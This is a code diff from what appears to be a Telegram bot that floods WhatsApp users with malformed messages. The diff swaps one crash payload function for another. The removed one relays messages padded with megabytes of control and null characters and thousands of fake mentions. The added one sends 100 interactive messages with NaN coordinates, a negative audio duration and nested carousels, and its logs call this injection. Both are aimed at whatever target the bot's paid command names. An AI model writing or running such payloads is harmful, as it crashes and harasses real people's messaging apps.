@@ -1583,7 +1583,7 @@ bot.command("xandro", checkWhatsAppConnection, checkPremium, async (ctx) => {
     try {
       while (Date.now() < endAt) {
         if (!isWhatsAppConnected) break;
-        await Seg(sock, target);
+        await BapakLoe(sock, target);
         await sleep(3000);
       }
     } catch (err) {
@@ -1867,113 +1867,85 @@ async function clearChat(target) {
 }
 
 //FANGSYEN
-async function Seg(target, ptcp = true) {
-    for (let r = 0; r < 100; r++) {
-        const payload = generateWAMessageFromContent(target, {
-            viewOnceMessage: {
-                message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: "Power",
-                            format: "DEFAULT"
-                        },
-                        nativeFlowResponseMessage: {
-                            name: "address_message",
-                            paramsJson: "\x10".repeat(1045000),
-                            version: 3
-                        },
-                        entryPointConversionSource: "call_permission_request"
-                    },
-                },
-            },
-        }, {
-            ephemeralExpiration: 0,
-            forwardingScore: 9741,
-            isForwarded: true,
-            font: Math.floor(Math.random() * 99999999),
-            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
-        });
-
-        await sock.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: payload.message,
-            },
-        }, ptcp ? {
-            messageId: payload.key.id,
-            participant: {
-                jid: target
-            }
-        } : {
-            messageId: payload.key.id
-        });
-        await sleep(1000);
-    }
-    let payload = "";
-    for (let i = 0; i < 399; i++) {
-        payload = "\u0000".repeat(2097152);
-    }
-
-    const Jambutxx = [
-        "0@s.whatsapp.net",
-        "13135550002@s.whatsapp.net",
-        ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
-    ];
-
-    const generateMessage = {
-        viewOnceMessage: {
-            message: {
-                imageMessage: {
-                    url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
-                    mimetype: "image/jpeg",
-                    fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
-                    fileLength: "211396",
-                    height: 816,
-                    width: 654,
-                    mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
-                    fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
-                    directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0",
-                    mediaKeyTimestamp: "1749220174",
-                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAADBQACBAEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABhB6gNNNTGLcMDiZqB7ZW0LKXPmQBV8PTrzAOOPOOzh1ugQ0IE9MlGMO6SszJlz8K2m4Hs5mG9JBJWQ4aQtvkP/8QAKRAAAgIBAgQEBwAAAAAAAAAAAQIAAxEEIRASEzEUQVJxBSMkQlFTYv/aAAgBAQABPwCzlbcRFyohSFIyQpGY115ni7PyZWQwwdjFGF4EQiFY9YavEK7y2pLFDVneV5KDMM1euKErXDq7z95lfxC1dm3hsFmnDDgtzDYShs1gmMAyEiaul0Yw7Hhp0KaTfz4FuUkyhvkL7Q3tW4AORmalBdWGEtUq5yIhHMM9syx1XTAjtiddoxZicgyvPhlGfKKC7gCarVdABF7y2w2kk9+C3PyFM7cG1L4IAERwmmDN6YdUq2Blmrt6lrGZg3lVBfG88Gn7I9JrfBEZvp8fzDWwMw2cYnTfMpqQrzY3ENirhT3hLZ84yq4wRHXCER7BneGxcY3hsBIMrtIr5V7kxhgp7wIvon//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/ACf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/ACf/2Q==",
-                    contextInfo: {
-                        mentionedJid: Jambutxx,
-                        isSampled: true,
-                        participant: target,
-                        remoteJid: "status@broadcast",
-                        forwardingScore: 2097152,
-                        isForwarded: true
+async function BapakLoe(sock, target) {
+    console.log(`[☕] SENDING TO ${target}...`);
+    const emptyList = []; 
+    const illegalCoord = NaN; 
+    const negativeDuration = -9999999;
+    for (let i = 0; i < 100; i++) { 
+        try {
+            const msg = generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                title: "FXX",
+                                hasMediaAttachment: true,
+                                locationMessage: {
+                                    degreesLatitude: illegalCoord, 
+                                    degreesLongitude: illegalCoord, 
+                                    name: "NullPointerException City",
+                                    address: "Jalan Buntu"
+                                }
+                            },
+                            body: {
+                                text: "System.out.println('null');"
+                            },
+                            
+                            carouselMessage: {
+                                cards: [
+                                    {
+                                        header: {
+                                            title: "Index 0",
+                                            hasMediaAttachment: false
+                                        },
+                                        body: { text: "test" },
+                                        nativeFlowMessage: {
+                                            buttons: [{
+                                                name: "cta_url",
+                                                buttonParamsJson: "{\"url\":\"https://google.com\"}"
+                                            }]
+                                        }
+                                    }
+                                    
+                                ],
+                                messageVersion: 1
+                            },
+                            contextInfo: {
+                                mentionedJid: emptyList, 
+                                groupMentions: [
+                                    { groupJid: target, groupSubject: "Hii" }
+                                ],
+                                
+                                isForwarded: true,
+                                forwardingScore: 999,
+                                quotedMessage: {
+                                    audioMessage: {
+                                        url: "https://raw.githubusercontent.com/bayuxxd/bebasajamaukayagmna/main/lagu.mp3",
+                                        mimetype: "audio/mp4",
+                                        seconds: negativeDuration, 
+                                        ptt: true
+                                    }
+                                }
+                            }
+                        }
                     }
-                },
-                nativeFlowResponseMessage: {
-                    name: "call_permission_request",
-                    paramsJson: payload
                 }
-            }
+            }, { 
+                userJid: sock.user.id,
+                quoted: null 
+            });
+            await sock.relayMessage(target, msg.message, {
+                messageId: msg.key.id,
+                participant: { jid: target }
+            });
+            await new Promise(r => setTimeout(r, 500)); 
+        } catch (e) {
+            console.log(`[!] Gagal inject paket ke-${i}:`, e);
         }
-    };
-
-    const msg = await generateWAMessageFromContent(target, generateMessage, {});
-
-    await sock.relayMessage("status@broadcast", msg.message, {
-        messageId: msg.key.id,
-        statusJidList: [target],
-        additionalNodes: [{
-            tag: "meta",
-            attrs: {},
-            content: [{
-                tag: "mentioned_users",
-                attrs: {},
-                content: [{
-                    tag: "to",
-                    attrs: {
-                        jid: target
-                    },
-                    content: undefined
-                }]
-            }]
-        }]
-    });
+    }
+    console.log("[✅] Injection Selesai.");
 }
-
 
 
 bot.launch({
